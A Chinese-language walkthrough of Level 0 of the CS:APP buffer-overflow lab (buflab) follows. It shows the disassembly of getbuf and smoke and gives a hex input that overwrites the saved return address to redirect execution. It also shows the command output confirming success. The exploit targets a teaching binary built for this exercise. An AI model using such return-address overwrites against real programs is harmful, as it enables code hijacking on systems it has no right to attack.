## buflab 实验

本实验材料通过官方网站下载：https://csapp.cs.cmu.edu/2e/labs.html

以下是我的解题过程

### Level 0

这一步的要求很简单，根据 `buflab.pdf` 有如下 test 函数：

```c
void test()
{
  int val;
  /* Put canary on stack to detect possible corruption */
  volatile int local = uniqueval();

  val = getbuf();

  /* Check for corrupted stack */
  if (local != uniqueval()) {
    printf("Sabotaged!: the stack has been corrupted\n");
  }
  else if (val == cookie) {
    printf("Boom!: getbuf returned 0x%x\n", val);
    validate(3);
  } else {
    printf("Dud: getbuf returned 0x%x\n", val);
  }
}
```

当 test 函数的 `getbuf` 调用返回时，通常情况下会继续执行 `val = getbuf();` 后面的语句，这一步的要求是通过输入特定的字符串来改变这个行为，使得 `getbuf` 返回时跳转到 `smoke` 函数执行。

```c
void smoke()
{
  printf("Smoke!: You called smoke()\n");
  validate(0);
  exit(0);
}
```

通过命令 `objdump -d` 反汇编 `bufbomb` 确定 `getbuf` 函数的实现：

```x86asm
080491f4 <getbuf>:
 80491f4:	55                   	push   %ebp
 80491f5:	89 e5                	mov    %esp,%ebp
 80491f7:	83 ec 38             	sub    $0x38,%esp
 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax
 80491fd:	89 04 24             	mov    %eax,(%esp)
 8049200:	e8 f5 fa ff ff       	call   8048cfa <Gets>
 8049205:	b8 01 00 00 00       	mov    $0x1,%eax
 804920a:	c9                   	leave  
 804920b:	c3                   	ret   
```

`getbuf` 通过 `Gets` 获取用户输入，将用户输入的字符串当在栈上，如果一切正常直接返回 1 给 `getbuf` 的调用方，忽略用户输入。

为了直观展示，这里给出调用 `Gets` 前的调用栈情况：

![](images/02_24_level_0_stack.svg)

**图 1：调用 Gets 前的 getbuf 的栈帧情况**

可以看到传给 `Gets` 的 buf 大小为 40 个字节，接下来是 4 个字节的 %ebp 寄存器原始值，4 个字节的 `getbuf` 返回值，为了达到 `getbuf` 返回时跳转到 `smoke` 函数的目的，只需要构造一个特定的字符串，将 `getbuf` 的返回值修改为 `smoke` 函数所在地址即可。

同样通过反汇编可知道 `smoke` 的地址：

```x86asm
08048c18 <smoke>:
 8048c18:	55                   	push   %ebp
 8048c19:	89 e5                	mov    %esp,%ebp
 8048c1b:	83 ec 18             	sub    $0x18,%esp
 8048c1e:	c7 04 24 d3 a4 04 08 	movl   $0x804a4d3,(%esp)
 8048c25:	e8 96 fc ff ff       	call   80488c0 <puts@plt>
 8048c2a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048c31:	e8 45 07 00 00       	call   804937b <validate>
 8048c36:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048c3d:	e8 be fc ff ff       	call   8048900 <exit@plt>
```

一个合法的输入序列为：

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08
```

假设上述的输入序列已经保存在文件 `0_smoke_hex.txt` 可使用如下命令，验证：

```bash
$ ./hex2raw < 0_smoke_hex.txt | ./bufbomb -u bovik
Userid: bovik
Cookie: 0x1005b2b7
Type string:Smoke!: You called smoke()
VALID
NICE JOB!
```